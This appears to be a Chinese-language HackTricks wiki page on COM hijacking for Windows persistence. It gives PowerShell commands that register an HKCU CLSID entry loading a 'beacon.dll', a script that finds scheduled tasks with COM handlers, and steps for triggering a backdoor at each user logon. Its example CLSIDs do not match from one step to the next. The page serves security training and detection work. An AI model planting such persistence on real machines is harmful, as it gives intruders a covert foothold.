# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 搜索不存在的 COM 组件

由于 HKCU 的值可以被用户修改，**COM Hijacking** 可以作为一种 **持久机制**。使用 `procmon` 很容易找到不存在的 COM 注册表项，攻击者可以创建这些项以实现持久化。过滤条件：

- **RegOpenKey** 操作。
- 其中 _Result_ 为 **NAME NOT FOUND**。
- 并且 _Path_ 以 **InprocServer32** 结尾。

一旦你决定了要伪装的不存在的 COM，执行以下命令。_如果你决定伪装一个每几秒加载一次的 COM，请小心，因为这可能会过于激进。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 可劫持的任务调度程序 COM 组件

Windows 任务使用自定义触发器调用 COM 对象，由于它们是通过任务调度程序执行的，因此更容易预测它们何时会被触发。

<pre class="language-powershell"><code class="lang-powershell"># 显示 COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "任务名称: " $Task.TaskName
Write-Host "任务路径: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# 示例输出:
<strong># 任务名称:  示例
</strong># 任务路径:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [更多类似于前面的...]</code></pre>

检查输出后，您可以选择一个将在 **每次用户登录时** 执行的任务，例如。

现在在 **HKEY\CLASSES\ROOT\CLSID** 以及 HKLM 和 HKCU 中搜索 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**，通常会发现该值在 HKCU 中不存在。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
然后，您可以创建 HKCU 条目，每次用户登录时，您的后门将被触发。

{{#include ../../banners/hacktricks-training.md}}
